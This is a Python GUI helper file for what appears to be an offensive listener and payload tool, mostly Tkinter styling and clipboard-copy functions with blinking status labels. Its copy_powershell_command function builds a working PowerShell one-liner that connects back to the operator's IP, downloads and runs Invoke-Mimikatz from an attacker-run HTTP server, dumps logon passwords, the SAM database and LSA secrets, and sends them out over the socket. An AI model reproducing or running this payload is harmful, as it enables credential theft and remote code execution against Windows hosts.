# ui_helpers.py - UI utilities and styling

import random
import string

# === UTILITY FUNCTIONS ===

def rand_var(length=8):
    """Generate random variable name"""
    return ''.join(random.choices(string.ascii_letters, k=length))

def copy_msf_command(app):
    """Copy MSF command to clipboard with visual feedback"""
    cmd = getattr(app, "full_msf_cmd", "No command yet")
    import pyperclip
    pyperclip.copy(cmd)

    # Set temporary status messages
    app.top_status_label.config(text="Command", foreground="#fefe00")
    app.bottom_status_label.config(text="Copied!", foreground="#fefe00")

    def blink_status(step=0):
        if step < 6:
            color = "#fefe00" if step % 2 == 0 else "#2e2e2e"
            app.top_status_label.config(foreground=color)
            app.bottom_status_label.config(foreground=color)
            app.root.after(200, lambda: blink_status(step + 1))
        else:
            app.top_status_label.config(text="Status", foreground="#ec1c3a")
            app.bottom_status_label.config(text="Ready", foreground="#91ddd3")

    blink_status()

def copy_powershell_command(app):
    """Copy PowerShell command to clipboard - simplified version"""
    # Force focus away from any input widgets to prevent interference
    app.root.focus_set()
    
    if not app.is_listening:
        # No command available or listener not running
        app.top_status_label.config(text="No Command", foreground="#ec1c3a")
        app.bottom_status_label.config(text="Start Listener First!", foreground="#ec1c3a")
        
        def error_blink(step=0):
            if step < 4:
                color = "#ec1c3a" if step % 2 == 0 else "#2e2e2e"
                app.top_status_label.config(foreground=color)
                app.bottom_status_label.config(foreground=color)
                app.root.after(300, lambda: error_blink(step + 1))
            else:
                app.top_status_label.config(text="Status", foreground="#ec1c3a")
                app.bottom_status_label.config(text="Ready", foreground="#91ddd3")
        
        error_blink()
        return
    
    import pyperclip
    
    # Get IP address from selected interface
    interface_name = app.selected_listener_interface.get()
    ip_address = app.get_interface_ip(interface_name)
    
    # Get port from port entry
    port = app.port_entry.get()
    
    # Get HTTP port for script download
    http_port = getattr(app, 'http_port', 8080)
    
    # Create the simple PowerShell command as requested
    ps_command = f'''$c=New-Object Net.Sockets.TcpClient("{ip_address}",{port});$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;IEX (New-Object Net.WebClient).DownloadString("http://{ip_address}:{http_port}/Invoke-Mimikatz.ps1");$r=Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords full" "lsadump::sam" "lsadump::secrets" "exit"';$w.WriteLine($r);$w.Close();$s.Close();$c.Close()'''
    
    # Clear any existing clipboard content and copy our command
    try:
        app.root.clipboard_clear()
        app.root.clipboard_append(ps_command)
        app.root.update()  # Ensure clipboard is updated
    except:
        # Fallback to pyperclip if tkinter clipboard fails
        pyperclip.copy(ps_command)

    # Set temporary status messages
    app.top_status_label.config(text="Command", foreground="#fefe00")
    app.bottom_status_label.config(text="Copied!", foreground="#fefe00")

    def blink_status(step=0):
        if step < 6:
            color = "#fefe00" if step % 2 == 0 else "#2e2e2e"
            app.top_status_label.config(foreground=color)
            app.bottom_status_label.config(foreground=color)
            app.root.after(200, lambda: blink_status(step + 1))
        else:
            app.top_status_label.config(text="Status", foreground="#ec1c3a")
            app.bottom_status_label.config(text="Ready", foreground="#91ddd3")

    blink_status()

def update_msf_entry(app, text):
    """Update MSF command entry text"""
    if hasattr(app, 'msf_entry'):
        app.msf_entry.insert("1.0", text)
        app.msf_entry.configure(state="disabled")

# === UI STYLING ===

def configure_styles(style):
    """Configure styles for ttk widgets"""
    base_label_config = {
        "font": ("Consolas", 15, "bold"),
        "background": "#000000"
    }

    # Labels
    style.configure("BaseLabel.TLabel", **base_label_config)
    style.configure("SectionLabel.TLabel", **base_label_config, foreground="#91ddd3")
    style.configure("MSFLabel.TLabel", **base_label_config, foreground="#fefe00")
    style.configure("SleepLabel.TLabel", **base_label_config, foreground="#3B5BB7")
    style.configure("StatusLabel.TLabel", **base_label_config, foreground="#EC1C3A")
    style.configure("BottomStatusLabel.TLabel", font=("Consolas", 13, "italic"), foreground="#91ddd3", background="#000000")

    # Checkbuttons
    style.configure("Neon.TCheckbutton",
        font=("Consolas", 15, "bold"),
        focuscolor="none",
        background="#000000",
        foreground="#91ddd3")

    # Comboboxes  
    style.configure("Neon.TCombobox",
        font=("Consolas", 12, "bold"),
        fieldbackground="#2e2e2e",
        background="#000000",
        foreground="#91ddd3",
        borderwidth=1,
        relief="solid",
        bordercolor="#91ddd3")

    # Red/Black Comboboxes for dropdowns
    style.configure("RedCombo.TCombobox",
        font=("Consolas", 12, "bold"),
        fieldbackground="#000000",
        background="#000000", 
        foreground="#ec1c3a",
        borderwidth=2,
        relief="solid",
        bordercolor="#ec1c3a",
        selectbackground="#ec1c3a",
        selectforeground="#000000")
    
    style.map("RedCombo.TCombobox",
        fieldbackground=[("readonly", "#000000"), ("focus", "#000000")],
        selectbackground=[("readonly", "#ec1c3a")],
        bordercolor=[("focus", "#ec1c3a")])

    # Buttons
    style.configure("Generate.TButton",
        font=("Consolas", 12, "bold"),
        background="#ec1c3a",
        foreground="#ffffff",
        borderwidth=0,
        focuscolor="none")

    style.configure("Build.TButton", 
        font=("Consolas", 12, "bold"),
        background="#91ddd3",
        foreground="#000000",
        borderwidth=0,
        focuscolor="none")

    style.configure("Copy.TButton",
        font=("Consolas", 12, "bold"), 
        background="#fefe00",
        foreground="#000000",
        borderwidth=0,
        focuscolor="none")

    # Notebook (Tab) styling
    style.configure("TNotebook", 
        background="#000000",
        borderwidth=0,
        tabmargins=[2, 5, 2, 0])
    
    style.configure("TNotebook.Tab",
        background="#2e2e2e",
        foreground="#91ddd3",
        font=("Consolas", 11, "bold"),
        padding=[20, 8],
        borderwidth=1,
        relief="solid",
        bordercolor="#91ddd3")
    
    style.map("TNotebook.Tab",
        background=[("selected", "#ec1c3a"), ("active", "#3e3e3e")],
        foreground=[("selected", "#ffffff"), ("active", "#fefe00")],
        bordercolor=[("selected", "#ec1c3a"), ("active", "#fefe00")])

    # Frame styling for dark theme
    style.configure("TFrame",
        background="#000000",
        borderwidth=0,
        relief="flat")
    
    style.configure("Dark.TFrame", 
        background="#000000",
        borderwidth=0,
        relief="flat")

    # Entry widget styling  
    style.configure("TEntry",
        background="#000000",
        foreground="#fefe00",
        insertbackground="#ec1c3a",
        borderwidth=1,
        relief="solid",
        bordercolor="#91ddd3")
    
    # Red Entry styling for port field with black text
    style.configure("RedEntry.TEntry",
        background="#000000",
        foreground="#000000",
        insertbackground="#ec1c3a",
        borderwidth=1,
        relief="solid",
        bordercolor="#ec1c3a")
